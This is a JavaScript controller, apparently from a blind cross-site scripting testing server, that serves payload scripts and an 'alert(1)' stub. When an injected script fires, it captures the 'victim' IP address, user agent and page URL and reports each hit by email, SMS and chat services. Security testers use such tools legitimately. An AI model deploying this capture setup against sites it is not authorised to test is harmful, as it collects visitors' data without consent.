// Copyright 2019 Lewis Ardern. All rights reserved.

const mail = require('../utilities/services/email');
const sms = require('../utilities/services/sms');
const save = require('../utilities/save');
const uuid = require('uuid/v1');
const config = require('../config/config');
const slack = require('../utilities/services/slack');
const discord = require('../utilities/services/discord');
const ciscoTeams = require('../utilities/services/spark');
const twitter = require('../utilities/services/twitter');
const template = require('../utilities/templates/script');
const payloads = require('../utilities/payloads');
const Domain = require('../utilities/domain');

/* eslint-disable no-shadow */
function reportToUtilities(guid, domain, config) {
  mail.sendMail(guid, domain, config);
  slack.sendSlack(guid, domain, config);
  ciscoTeams.sendCiso(guid, domain, config);
  discord.sendDiscord(guid, domain, config);
  twitter.sendTwitter(guid, domain, config);
}

function sendSmsAndSaveToDisk(domain, res, guid) {
  if (!sms.lastSms()) {
    console.log(`Sending SMS And Saving To Disk For URL ${domain.url}`);
    sms.sendSMS(guid, domain, config, save);
    save.saveCapuredResults(guid, domain, config);
    res.redirect(domain.url);
  } else {
    console.log(`Already Sent SMS Today, Saving To Disk For URL ${domain.url}`);
    save.saveCapuredResults(guid, domain, config);
    res.redirect(domain.url);
  }
}
/* eslint-enable no-shadow */

exports.displayScript = (req, res) => {
  res.type('.js');
  const generatedTemplate = template.generateTemplate(config);
  res.send(generatedTemplate);
};

exports.displayDefault = (req, res) => {
  res.type('.js');
  res.send('alert(1)');
};

exports.generatePayloads = (req, res) => {
  res.set('Content-Type', 'text/plain');
  const generatedPayloads = payloads.generatePayloads(config);
  res.send(generatedPayloads);
};

exports.capture = (req, res) => {
  let domain = {};
  const guid = uuid();
  if (req.body._) {
    domain = Domain.fromPayload(req.body._, config);
  } else {
    domain = new Domain(config);
    console.log(req.get('referer'));
    domain.url = req.get('referer') || null;
  }
  domain.victimIP =
    req.headers['x-forwarded-for'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    req.connection.socket.remoteAddress ||
    null;
  domain.userAgent = req.headers['user-agent'] || null;

  sendSmsAndSaveToDisk(domain, res, guid);

  reportToUtilities(guid, domain, config);
};
